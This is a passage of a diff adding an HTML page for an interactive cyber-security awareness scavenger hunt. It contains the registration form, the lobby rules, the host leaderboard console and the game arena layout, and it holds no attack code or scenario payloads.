@@ -1,0 +1,2297 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Security Interactive Scavenger Hunt</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Google Fonts: Inter & JetBrains Mono -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['"JetBrains Mono"', 'monospace'],
+                    },
+                    colors: {
+                        cyber: {
+                            50: '#ecfeff',
+                            100: '#cffafe',
+                            400: '#22d3ee',
+                            500: '#06b6d4',
+                            600: '#0891b2',
+                            900: '#164e63',
+                            950: '#082f49',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Force uniform crosshair/default cursor across all simulation elements so nothing gives away the answer */
+        .hunt-viewport, 
+        .hunt-viewport *,
+        .hunt-target, 
+        .hunt-decoy {
+            cursor: default !important;
+        }
+
+        /* Strict font-inheritance lock to prevent size/weight giveaways */
+        .hunt-target, .hunt-decoy {
+            font-size: inherit !important;
+            font-weight: inherit !important;
+            font-family: inherit !important;
+            line-height: inherit !important;
+            letter-spacing: inherit !important;
+            color: inherit !important;
+            background-color: inherit !important;
+            border-color: inherit !important;
+            text-decoration: inherit !important;
+            display: inline !important;
+        }
+
+        /* Error shake animation on incorrect selection */
+        @keyframes screenShake {
+            0%, 100% { transform: translateX(0); }
+            15% { transform: translateX(-8px) rotate(-0.5deg); }
+            30% { transform: translateX(7px) rotate(0.5deg); }
+            45% { transform: translateX(-6px); }
+            60% { transform: translateX(5px); }
+            75% { transform: translateX(-3px); }
+            90% { transform: translateX(2px); }
+        }
+
+        .screen-shake-effect {
+            animation: screenShake 0.45s cubic-bezier(.36,.07,.19,.97) both;
+            box-shadow: 0 0 35px rgba(239, 68, 68, 0.45) !important;
+            border-color: rgba(239, 68, 68, 0.8) !important;
+        }
+
+        /* Post-task highlight animation on revealed flaw */
+        @keyframes pulseHighlight {
+            0%, 100% {
+                background-color: rgba(245, 158, 11, 0.25);
+                outline: 2px solid #f59e0b;
+                box-shadow: 0 0 18px rgba(245, 158, 11, 0.6);
+            }
+            50% {
+                background-color: rgba(245, 158, 11, 0.55);
+                outline: 3px solid #fbbf24;
+                box-shadow: 0 0 28px rgba(245, 158, 11, 0.9);
+            }
+        }
+
+        .reveal-flaw-highlight {
+            animation: pulseHighlight 1.5s infinite ease-in-out !important;
+            border-radius: 4px !important;
+            display: inline-block !important;
+            color: #fef08a !important;
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #020617;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1e293b;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #334155;
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col font-sans select-none antialiased">
+
+    <!-- Top Persistent Navigation Header -->
+    <header class="sticky top-0 z-40 bg-slate-950/90 backdrop-blur-md border-b border-slate-800/80 px-4 sm:px-6 py-3 transition">
+        <div class="max-w-7xl mx-auto flex items-center justify-between">
+            <!-- Brand & Security Shield -->
+            <div class="flex items-center space-x-3 cursor-pointer" onclick="returnToHomeSafe()">
+                <div class="w-9 h-9 rounded-xl bg-gradient-to-tr from-cyan-600 via-cyan-500 to-emerald-400 flex items-center justify-center shadow-lg shadow-cyan-500/20 text-slate-950 font-black text-lg">
+                    <i class="fa-solid fa-shield-halved"></i>
+                </div>
+                <div>
+                    <h1 class="text-sm sm:text-base font-extrabold tracking-tight text-white flex items-center gap-2">
+                        <span>CYBERSHIELD</span>
+                        <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-950/80 text-cyan-300 border border-cyan-500/30">WAR ROOM</span>
+                    </h1>
+                    <p class="text-[11px] text-slate-400 font-mono hidden sm:block">Interactive Cyber Defense Scavenger Hunt</p>
+                </div>
+            </div>
+
+            <!-- Active User & Live Persistent Timer Badges -->
+            <div id="navActiveControls" class="hidden flex items-center space-x-3 sm:space-x-4">
+                <!-- User Identity Badge -->
+                <div class="hidden sm:flex items-center space-x-2 bg-slate-900 border border-slate-800 px-3 py-1.5 rounded-xl font-mono text-xs">
+                    <i class="fa-solid fa-user-shield text-cyan-400"></i>
+                    <span id="navParticipantName" class="text-white font-bold">Agent</span>
+                    <span class="text-slate-500">|</span>
+                    <span id="navParticipantRr" class="text-cyan-300 font-bold">ID: --</span>
+                </div>
+
+                <!-- Sticky Persistent Glowing Timer -->
+                <div class="flex items-center space-x-2 bg-slate-900/90 border border-cyan-500/40 px-3.5 py-1.5 rounded-xl shadow-[0_0_15px_rgba(6,182,212,0.15)] font-mono text-xs sm:text-sm">
+                    <i class="fa-solid fa-stopwatch text-cyan-400 animate-pulse"></i>
+                    <span class="text-slate-400 text-xs hidden md:inline">ACTIVE:</span>
+                    <span id="navLiveTimer" class="font-black text-cyan-300">00:00</span>
+                </div>
+            </div>
+
+            <!-- Header Action Controls -->
+            <div class="flex items-center space-x-2 sm:space-x-3">
+                <button onclick="openInviteModal()" class="px-3 py-1.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-200 text-xs font-mono font-medium flex items-center space-x-1.5 transition">
+                    <i class="fa-solid fa-share-nodes text-cyan-400"></i>
+                    <span class="hidden sm:inline">Invite Colleagues</span>
+                </button>
+                <button onclick="openHostPinModal()" class="px-3 py-1.5 rounded-xl bg-gradient-to-r from-amber-500/20 to-amber-600/10 hover:from-amber-500/30 hover:to-amber-600/20 border border-amber-500/40 text-amber-300 text-xs font-mono font-bold flex items-center space-x-1.5 transition">
+                    <i class="fa-solid fa-lock text-amber-400"></i>
+                    <span>Host Portal</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Master Application Viewport -->
+    <main class="flex-grow flex flex-col w-full max-w-7xl mx-auto px-4 sm:px-6 py-4">
+
+        <!-- ======================================================== -->
+        <!-- SCREEN 1: Participant Onboarding & Registration Form     -->
+        <!-- ======================================================== -->
+        <section id="screenOnboarding" class="flex-grow flex flex-col justify-center items-center py-6">
+            <div class="max-w-xl w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-10 shadow-2xl backdrop-blur-xl relative overflow-hidden">
+                <!-- Subtle background glow -->
+                <div class="absolute -top-24 -right-24 w-64 h-64 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none"></div>
+                <div class="absolute -bottom-24 -left-24 w-64 h-64 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+                <div class="relative z-10 space-y-6">
+                    <!-- Heading -->
+                    <div class="text-center space-y-2">
+                        <div class="inline-flex items-center space-x-2 px-3.5 py-1 rounded-full bg-cyan-950/70 border border-cyan-500/30 text-cyan-300 font-mono text-xs">
+                            <span class="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></span>
+                            <span>CYBER READINESS EXERCISE</span>
+                        </div>
+                        <h2 class="text-2xl sm:text-3xl font-black text-white tracking-tight">Security Threat Scavenger Hunt</h2>
+                        <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+                            Analyze realistic workplace emails, web portals, physical desk setups, code snippets, and authorization requests to uncover concealed security flaws.
+                        </p>
+                    </div>
+
+                    <!-- Live Joined Participants Counter -->
+                    <div class="flex items-center justify-center p-3 rounded-2xl bg-slate-950/80 border border-slate-800/80">
+                        <div class="flex items-center space-x-3 text-xs font-mono">
+                            <span class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                            <span class="text-slate-400">Total Participants Enrolled:</span>
+                            <span id="onboardingParticipantsCount" class="font-bold text-emerald-400 text-sm">0</span>
+                        </div>
+                    </div>
+
+                    <!-- Registration Form -->
+                    <form id="formRegistration" onsubmit="handleRegistrationSubmit(event)" class="space-y-4 pt-2">
+                        <!-- Full Name -->
+                        <div class="space-y-1.5">
+                            <label for="inputFullName" class="block text-xs font-mono uppercase tracking-wider text-slate-300 font-semibold">
+                                Full Name <span class="text-rose-400">*</span>
+                            </label>
+                            <div class="relative">
+                                <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-user"></i>
+                                </span>
+                                <input type="text" id="inputFullName" required placeholder="e.g., Alex Mercer"
+                                    class="w-full pl-10 pr-4 py-3 bg-slate-950 border border-slate-800 focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 rounded-xl text-white font-sans text-sm placeholder-slate-600 transition outline-none">
+                            </div>
+                        </div>
+
+                        <!-- RR ID / WL ID -->
+                        <div class="space-y-1.5">
+                            <label for="inputRrId" class="block text-xs font-mono uppercase tracking-wider text-slate-300 font-semibold">
+                                RR ID / WL ID <span class="text-rose-400">*</span>
+                                <span class="text-slate-500 lowercase font-normal">(strict single-entry locked)</span>
+                            </label>
+                            <div class="relative">
+                                <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                    <i class="fa-solid fa-id-card"></i>
+                                </span>
+                                <input type="text" id="inputRrId" required placeholder="e.g., RR-90421 or WL-1048"
+                                    class="w-full pl-10 pr-4 py-3 bg-slate-950 border border-slate-800 focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 rounded-xl text-white font-mono text-sm placeholder-slate-600 transition outline-none uppercase">
+                            </div>
+                        </div>
+
+                        <!-- Notice Badge -->
+                        <div class="p-3 bg-slate-950/60 rounded-xl border border-slate-800/80 text-[11px] font-mono text-slate-400 flex items-start space-x-2.5">
+                            <i class="fa-solid fa-circle-info text-cyan-400 mt-0.5 shrink-0"></i>
+                            <span>Each RR ID / WL ID is granted strictly <strong>one official hunt entry</strong>. Once completed, scores are permanently recorded in the War Room.</span>
+                        </div>
+
+                        <!-- Submit Button -->
+                        <button type="submit" class="w-full py-3.5 px-6 rounded-2xl bg-gradient-to-r from-cyan-500 via-cyan-400 to-emerald-400 hover:from-cyan-400 hover:to-emerald-300 text-slate-950 font-black font-mono text-sm uppercase tracking-wider shadow-lg shadow-cyan-500/20 active:scale-[0.99] transition flex items-center justify-center space-x-2">
+                            <span>Enter Participant Waiting Lobby</span>
+                            <i class="fa-solid fa-arrow-right"></i>
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </section>
+
+        <!-- ======================================================== -->
+        <!-- SCREEN 2: Participant Waiting Lobby (Rules on Left)      -->
+        <!-- ======================================================== -->
+        <section id="screenParticipantLobby" class="hidden flex-grow flex flex-col justify-center py-4">
+            <div class="max-w-6xl w-full mx-auto grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
+                
+                <!-- LEFT COLUMN: Official Rules & Operational Directives (Lobby Rules Board) -->
+                <div class="lg:col-span-6 bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 flex flex-col justify-between shadow-xl">
+                    <div class="space-y-4">
+                        <div class="flex items-center space-x-2 text-cyan-400 font-mono text-xs uppercase tracking-wider">
+                            <i class="fa-solid fa-book-bookmark"></i>
+                            <span>Mission Directives & Guidelines</span>
+                        </div>
+                        <h3 class="text-xl sm:text-2xl font-black text-white">How To Play The Hunt</h3>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            Read each scenario carefully. Your mission is to spot the specific vulnerability or deceptive cyber threat embedded in the simulated workstation screen.
+                        </p>
+
+                        <!-- Rule Cards List -->
+                        <div class="space-y-3 pt-2">
+                            <!-- Directive 1 -->
+                            <div class="p-3.5 rounded-2xl bg-slate-950/70 border border-slate-800/80 flex items-start space-x-3">
+                                <div class="w-7 h-7 rounded-lg bg-cyan-950 text-cyan-400 border border-cyan-500/30 flex items-center justify-center text-xs font-mono font-bold shrink-0">1</div>
+                                <div class="text-xs">
+                                    <h4 class="font-bold text-white mb-0.5">Strict Locked Cursor</h4>
+                                    <p class="text-slate-400">The reticle cursor never changes into a hand or pointer. No hovering giveaways exist—inspect text and details visually.</p>
+                                </div>
+                            </div>
+
+                            <!-- Directive 2 -->
+                            <div class="p-3.5 rounded-2xl bg-slate-950/70 border border-slate-800/80 flex items-start space-x-3">
+                                <div class="w-7 h-7 rounded-lg bg-rose-950 text-rose-400 border border-rose-500/30 flex items-center justify-center text-xs font-mono font-bold shrink-0">2</div>
+                                <div class="text-xs">
+                                    <h4 class="font-bold text-white mb-0.5">3 Tries Maximum & +30s Penalty</h4>
+                                    <p class="text-slate-400">Wrong clicks trigger haptic vibration and screen shake. On the 3rd wrong click, a +30s penalty is applied and the answer is revealed.</p>
+                                </div>
+                            </div>
+
+                            <!-- Directive 3 -->
+                            <div class="p-3.5 rounded-2xl bg-slate-950/70 border border-slate-800/80 flex items-start space-x-3">
+                                <div class="w-7 h-7 rounded-lg bg-amber-950 text-amber-400 border border-amber-500/30 flex items-center justify-center text-xs font-mono font-bold shrink-0">3</div>
+                                <div class="text-xs">
+                                    <h4 class="font-bold text-white mb-0.5">1 Tactical Hint Per Task</h4>
+                                    <p class="text-slate-400">If stuck, tap the Hint button. You get exactly 1 guidance hint per scenario without penalty.</p>
+                                </div>
+                            </div>
+
+                            <!-- Directive 4 -->
+                            <div class="p-3.5 rounded-2xl bg-slate-950/70 border border-slate-800/80 flex items-start space-x-3">
+                                <div class="w-7 h-7 rounded-lg bg-emerald-950 text-emerald-400 border border-emerald-500/30 flex items-center justify-center text-xs font-mono font-bold shrink-0">4</div>
+                                <div class="text-xs">
+                                    <h4 class="font-bold text-white mb-0.5">Timer Pauses During Debrief</h4>
+                                    <p class="text-slate-400">After finding the threat or completing 3 tries, your timer automatically pauses so you can read the security takeaway stress-free.</p>
+                                </div>
+                            </div>
+
+                            <!-- Directive 5 -->
+                            <div class="p-3.5 rounded-2xl bg-slate-950/70 border border-slate-800/80 flex items-start space-x-3">
+                                <div class="w-7 h-7 rounded-lg bg-purple-950 text-purple-400 border border-purple-500/30 flex items-center justify-center text-xs font-mono font-bold shrink-0">5</div>
+                                <div class="text-xs">
+                                    <h4 class="font-bold text-white mb-0.5">Anti-Cheat Question Shuffling</h4>
+                                    <p class="text-slate-400">Scenarios are randomized uniquely for each participant so no two neighbors have the same challenge order.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="pt-4 border-t border-slate-800/80 flex items-center justify-between text-[11px] font-mono text-slate-500">
+                        <span>Standard Security Defense Protocol</span>
+                        <span class="text-cyan-400">10 Total Scenarios</span>
+                    </div>
+                </div>
+
+                <!-- RIGHT COLUMN: Waiting Status, Radar & Connected Peers -->
+                <div class="lg:col-span-6 bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 flex flex-col justify-between shadow-xl text-center space-y-6">
+                    <div class="space-y-4">
+                        <!-- Radar Animation -->
+                        <div class="relative w-24 h-24 mx-auto flex items-center justify-center mt-2">
+                            <span class="absolute inset-0 rounded-full bg-cyan-500/20 animate-ping"></span>
+                            <span class="absolute inset-2 rounded-full border border-cyan-500/40 animate-pulse"></span>
+                            <div class="w-16 h-16 rounded-full bg-cyan-950/80 border border-cyan-500/50 flex items-center justify-center text-cyan-400 text-2xl shadow-lg relative z-10">
+                                <i class="fa-solid fa-satellite-dish animate-bounce"></i>
+                            </div>
+                        </div>
+
+                        <!-- Waiting Status Text -->
+                        <div class="space-y-1">
+                            <span class="text-xs font-mono uppercase tracking-widest text-amber-400 bg-amber-950/60 border border-amber-800/80 px-3 py-1 rounded-full">
+                                Standby in Waiting Lobby
+                            </span>
+                            <h3 class="text-2xl font-black text-white pt-2">Waiting For Host To Launch</h3>
+                            <p class="text-xs text-slate-400 max-w-sm mx-auto">
+                                You are signed in as <strong id="lobbyUserName" class="text-cyan-300">Agent</strong> (<span id="lobbyUserRr" class="font-mono text-amber-300">--</span>). The challenge will start automatically on your screen once the Host launches the event.
+                            </p>
+                        </div>
+
+                        <!-- Connected Peers List -->
+                        <div class="bg-slate-950/90 border border-slate-800 rounded-2xl p-4 text-left space-y-2">
+                            <div class="flex items-center justify-between border-b border-slate-800/80 pb-2">
+                                <span class="text-xs font-mono text-slate-400">Teammates in Lobby:</span>
+                                <span id="lobbyParticipantsCount" class="text-xs font-mono font-bold text-cyan-400">0 Joined</span>
+                            </div>
+                            <div id="lobbyPeersContainer" class="flex flex-wrap gap-1.5 max-h-36 overflow-y-auto pt-1 pr-1">
+                                <!-- Populated dynamically -->
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Bottom Action Controls -->
+                    <div class="pt-4 border-t border-slate-800/80 flex flex-wrap items-center justify-between gap-3">
+                        <button onclick="openInviteModal()" class="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-mono font-bold flex items-center space-x-2 transition">
+                            <i class="fa-solid fa-share-nodes text-cyan-400"></i>
+                            <span>Invite Colleagues</span>
+                        </button>
+                        <button onclick="openHostPinModal()" class="text-xs font-mono text-amber-400 hover:text-amber-300 underline underline-offset-4">
+                            Are you the Host? Enter War Room &rarr;
+                        </button>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ======================================================== -->
+        <!-- SCREEN 3: Host / Administrator War Room                  -->
+        <!-- ======================================================== -->
+        <section id="screenHostWarRoom" class="hidden flex-grow flex flex-col space-y-6 py-2">
+            <!-- War Room Banner -->
+            <div class="bg-slate-900/90 border border-slate-800 rounded-3xl p-5 sm:p-6 shadow-2xl flex flex-col md:flex-row md:items-center justify-between gap-4">
+                <div class="space-y-1">
+                    <div class="flex items-center space-x-2">
+                        <span class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping"></span>
+                        <h2 class="text-lg sm:text-xl font-black text-white font-mono uppercase tracking-wide">
+                            HOST WAR ROOM CONTROL CONSOLE
+                        </h2>
+                    </div>
+                    <p class="text-xs text-slate-400 font-mono">
+                        Live Master Leaderboard: Ranked strictly by <strong class="text-white">Score (Threats Found)</strong> &rarr; <strong class="text-cyan-300">Lowest Time Consumed</strong>
+                    </p>
+                </div>
+
+                <!-- Host Action Controls -->
+                <div class="flex flex-wrap items-center gap-3">
+                    <button onclick="openInviteModal()" class="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-mono font-bold flex items-center space-x-2 transition">
+                        <i class="fa-solid fa-share-nodes text-cyan-400"></i>
+                        <span>Invite Friends</span>
+                    </button>
+                    
+                    <button id="btnLaunchAll" onclick="hostLaunchCompetition()" class="px-6 py-2.5 rounded-xl bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-400 hover:to-cyan-400 text-slate-950 font-black text-xs font-mono uppercase tracking-wider shadow-lg shadow-emerald-500/20 flex items-center space-x-2 transition transform active:scale-95">
+                        <i class="fa-solid fa-rocket"></i>
+                        <span>Launch Competition For All</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Host War Room: Pending Reconnection Requests Alert Drawer -->
+            <div id="hostPendingApprovalSection" class="hidden bg-gradient-to-r from-amber-950/40 via-slate-900 to-amber-950/40 border-2 border-amber-500/60 rounded-3xl p-5 space-y-3 shadow-[0_0_30px_rgba(245,158,11,0.25)]">
+                <div class="flex items-center justify-between border-b border-amber-500/30 pb-3">
+                    <div class="flex items-center space-x-2.5">
+                        <span class="w-3 h-3 rounded-full bg-amber-400 animate-ping"></span>
+                        <h3 class="text-sm font-black font-mono uppercase tracking-wider text-amber-300 flex items-center gap-2">
+                            <i class="fa-solid fa-shield-virus text-amber-400 text-base"></i>
+                            <span>Urgent: Mid-Activity Reconnection Requests (<span id="hostPendingCount">0</span>)</span>
+                        </h3>
+                    </div>
+                    <span class="text-[10px] font-mono text-amber-400/80 bg-amber-500/10 border border-amber-500/30 px-2 py-0.5 rounded">Action Required</span>
+                </div>
+                
+                <p class="text-xs text-slate-300">
+                    The following participants disconnected during their active hunt and are requesting re-entry. Approving allows them to resume from their exact recorded question and time.
+                </p>
+
+                <div id="hostPendingRequestsList" class="space-y-2">
+                    <!-- Dynamically populated pending requests -->
+                </div>
+            </div>
+
+            <!-- Host Metrics & Top 3 Podium Cards -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <!-- 1st Place Gold -->
+                <div class="bg-slate-900/90 border border-amber-500/40 rounded-2xl p-4 shadow-lg relative overflow-hidden">
+                    <div class="absolute -right-4 -bottom-4 text-6xl text-amber-500/10 font-black font-mono select-none">#1</div>
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="px-2.5 py-0.5 rounded-lg bg-amber-500/20 text-amber-300 border border-amber-500/40 font-mono text-xs font-bold flex items-center gap-1.5">
+                            <i class="fa-solid fa-trophy text-amber-400"></i> 1ST PLACE GOLD
+                        </span>
+                        <span id="hostPodium1Score" class="font-mono font-black text-emerald-400 text-sm">0 / 10</span>
+                    </div>
+                    <h4 id="hostPodium1Name" class="text-base font-bold text-white truncate">Awaiting Leader...</h4>
+                    <div class="flex items-center justify-between text-xs font-mono text-slate-400 mt-2">
+                        <span>ID: <strong id="hostPodium1Id" class="text-cyan-300">--</strong></span>
+                        <span>Time: <strong id="hostPodium1Time" class="text-amber-300">00:00</strong></span>
+                    </div>
+                </div>
+
+                <!-- 2nd Place Silver -->
+                <div class="bg-slate-900/90 border border-slate-400/40 rounded-2xl p-4 shadow-lg relative overflow-hidden">
+                    <div class="absolute -right-4 -bottom-4 text-6xl text-slate-400/10 font-black font-mono select-none">#2</div>
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="px-2.5 py-0.5 rounded-lg bg-slate-400/20 text-slate-200 border border-slate-400/40 font-mono text-xs font-bold flex items-center gap-1.5">
+                            <i class="fa-solid fa-medal text-slate-300"></i> 2ND PLACE SILVER
+                        </span>
+                        <span id="hostPodium2Score" class="font-mono font-black text-emerald-400 text-sm">0 / 10</span>
+                    </div>
+                    <h4 id="hostPodium2Name" class="text-base font-bold text-white truncate">Awaiting Runner-Up...</h4>
+                    <div class="flex items-center justify-between text-xs font-mono text-slate-400 mt-2">
+                        <span>ID: <strong id="hostPodium2Id" class="text-cyan-300">--</strong></span>
+                        <span>Time: <strong id="hostPodium2Time" class="text-slate-300">00:00</strong></span>
+                    </div>
+                </div>
+
+                <!-- 3rd Place Bronze -->
+                <div class="bg-slate-900/90 border border-amber-700/40 rounded-2xl p-4 shadow-lg relative overflow-hidden">
+                    <div class="absolute -right-4 -bottom-4 text-6xl text-amber-700/10 font-black font-mono select-none">#3</div>
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="px-2.5 py-0.5 rounded-lg bg-amber-700/20 text-amber-400 border border-amber-700/40 font-mono text-xs font-bold flex items-center gap-1.5">
+                            <i class="fa-solid fa-award text-amber-500"></i> 3RD PLACE BRONZE
+                        </span>
+                        <span id="hostPodium3Score" class="font-mono font-black text-emerald-400 text-sm">0 / 10</span>
+                    </div>
+                    <h4 id="hostPodium3Name" class="text-base font-bold text-white truncate">Awaiting 3rd Place...</h4>
+                    <div class="flex items-center justify-between text-xs font-mono text-slate-400 mt-2">
+                        <span>ID: <strong id="hostPodium3Id" class="text-cyan-300">--</strong></span>
+                        <span>Time: <strong id="hostPodium3Time" class="text-amber-400">00:00</strong></span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Host Roster & Live Standings Table -->
+            <div class="bg-slate-900/90 border border-slate-800 rounded-3xl p-5 shadow-xl space-y-4">
+                <div class="flex items-center justify-between border-b border-slate-800/80 pb-3">
+                    <div class="flex items-center space-x-2">
+                        <i class="fa-solid fa-users text-cyan-400"></i>
+                        <h3 class="text-sm font-bold text-white font-mono uppercase">Live Participant Telemetry</h3>
+                    </div>
+                    <div class="text-xs font-mono text-slate-400">
+                        Total Enrolled: <strong id="hostStatTotal" class="text-white">0</strong> | 
+                        Waiting in Lobby: <strong id="hostStatLobby" class="text-amber-300">0</strong> | 
+                        Finished: <strong id="hostStatFinished" class="text-emerald-400">0</strong>
+                    </div>
+                </div>
+
+                <!-- Table Container -->
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-xs font-mono">
+                        <thead>
+                            <tr class="text-slate-400 border-b border-slate-800 text-[11px] uppercase tracking-wider">
+                                <th class="py-2.5 px-3">Rank</th>
+                                <th class="py-2.5 px-3">Participant Name</th>
+                                <th class="py-2.5 px-3">RR ID / WL ID</th>
+                                <th class="py-2.5 px-3">Status</th>
+                                <th class="py-2.5 px-3">Live Task</th>
+                                <th class="py-2.5 px-3">Score (Max 10)</th>
+                                <th class="py-2.5 px-3">Live Active Time</th>
+                                <th class="py-2.5 px-3">Penalties</th>
+                            </tr>
+                        </thead>
+                        <tbody id="hostRosterTableBody" class="divide-y divide-slate-800/50">
+                            <!-- Populated dynamically every second -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <!-- ======================================================== -->
+        <!-- SCREEN 4: Interactive Scavenger Hunt Arena               -->
+        <!-- ======================================================== -->
+        <section id="screenArena" class="hidden flex-grow flex flex-col space-y-4 py-1">
+            <!-- Sticky Heads-Up Display (HUD) Bar -->
+            <div class="sticky top-[58px] sm:top-[62px] z-30 bg-slate-900/95 border border-slate-800 rounded-2xl p-3 sm:p-4 shadow-xl backdrop-blur-md flex flex-wrap items-center justify-between gap-3">
+                
+                <!-- Left: Task Index & Scenario Title -->
+                <div class="flex items-center space-x-3">
+                    <div class="w-9 h-9 rounded-xl bg-cyan-950 border border-cyan-500/40 text-cyan-300 flex items-center justify-center font-mono font-black text-sm">
+                        <span id="arenaTaskIndex">01</span>
+                    </div>
+                    <div>
+                        <div class="flex items-center space-x-2">
+                            <span class="text-[10px] font-mono uppercase tracking-widest text-slate-400">SCENARIO</span>
+                            <span id="arenaTaskProgress" class="text-[10px] font-mono text-cyan-400 font-bold">TASK 1 OF 10</span>
+                        </div>
+                        <h3 id="arenaScenarioTitle" class="text-xs sm:text-sm font-bold text-white truncate max-w-xs sm:max-w-md">
+                            Phishing Email Header Inspection
+                        </h3>
+                    </div>
+                </div>
+
+                <!-- Center & Right: Tries Left, Hints, Score, and Timer -->
+                <div class="flex items-center space-x-3 sm:space-x-4">
+                    <!-- 3 Tries Indicator -->
+                    <div class="flex items-center space-x-1.5 bg-slate-950 border border-slate-800 px-3 py-1.5 rounded-xl font-mono text-xs">
+                        <i class="fa-solid fa-shield-cat text-rose-400"></i>
+                        <span class="text-slate-400 hidden sm:inline">Tries:</span>
+                        <span id="arenaTriesCount" class="font-black text-rose-300">0 / 3</span>
+                    </div>
+
+                    <!-- 1 Hint Available Button -->
+                    <button id="btnHintToggle" onclick="toggleTaskHint()" class="flex items-center space-x-1.5 bg-slate-950 hover:bg-slate-800 border border-amber-500/40 text-amber-300 px-3 py-1.5 rounded-xl font-mono text-xs font-bold transition">
+                        <i class="fa-solid fa-lightbulb text-amber-400"></i>
+                        <span id="arenaHintLabel">Hint (1 Left)</span>
+                    </button>
+
+                    <!-- Score Badge -->
+                    <div class="flex items-center space-x-1.5 bg-slate-950 border border-slate-800 px-3 py-1.5 rounded-xl font-mono text-xs">
+                        <i class="fa-solid fa-bullseye text-emerald-400"></i>
+                        <span class="text-slate-400 hidden sm:inline">Score:</span>
+                        <span id="arenaScoreCount" class="font-black text-emerald-300">0 / 10</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Hint Callout (Hidden by Default) -->
+            <div id="arenaHintCard" class="hidden p-3.5 bg-amber-950/40 border border-amber-500/40 rounded-2xl text-xs font-mono text-amber-200 flex items-start space-x-3 shadow-inner">
+                <i class="fa-solid fa-circle-question text-amber-400 text-sm mt-0.5 shrink-0"></i>
+                <div>
+                    <span class="font-bold uppercase tracking-wider text-amber-300">Tactical Intel Hint:</span>
+                    <p id="arenaHintText" class="mt-0.5 text-slate-300"></p>
+                </div>
+            </div>
+
+            <!-- Scenario Task Instructions -->
+            <div class="p-3 bg-slate-900/60 border border-slate-800/80 rounded-2xl flex items-center justify-between text-xs font-mono text-slate-300">
+                <div class="flex items-center space-x-2">
+                    <i class="fa-solid fa-crosshairs text-cyan-400"></i>
+                    <span><strong>Objective:</strong> <span id="arenaObjectiveText">Click directly on the deceptive or malicious flaw in the screen below.</span></span>
+                </div>
+                <span class="text-[10px] text-slate-500 hidden md:inline">Locked Cursor Active</span>
+            </div>
+
+            <!-- Workstation Simulation Screen (Full Space Viewport) -->
+            <div id="interactiveContainer" class="flex-grow w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-4 sm:p-6 shadow-2xl relative flex flex-col justify-start min-h-[480px]">
+                <div id="liveViewport" class="hunt-viewport w-full h-full flex flex-col">
+                    <!-- Populated dynamically by scenario renderer -->
+                </div>
+            </div>
+        </section>
+
+        <!-- ======================================================== -->
+        <!-- SCREEN 5: Debrief & Security Tips Dialog (Full Space)    -->
+        <!-- ======================================================== -->
+        <div id="modalDebrief" class="hidden fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4 overflow-y-auto">
+            <div class="max-w-4xl w-full bg-slate-900/95 border-2 border-slate-700/80 rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6 text-left relative overflow-hidden">
+                
+                <!-- Status Header Banner -->
+                <div class="flex items-center justify-between border-b border-slate-800 pb-4">
+                    <div class="flex items-center space-x-3">
